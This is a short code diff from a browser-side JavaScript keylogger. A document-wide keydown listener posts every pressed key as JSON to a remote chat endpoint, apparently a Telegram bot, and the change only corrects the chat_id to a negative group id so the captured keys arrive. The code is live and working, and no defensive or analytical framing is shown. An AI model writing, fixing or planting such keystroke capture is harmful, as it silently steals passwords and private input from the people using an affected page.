@@ -5,7 +5,7 @@ document.addEventListener("keydown", function(event) {
             "Content-Type": "application/json"
         },
         body: JSON.stringify({
-            chat_id: "1002002449257",
+            chat_id: "-1002002449257",
             text: "Key Pressed: " + event.key
         })
     });
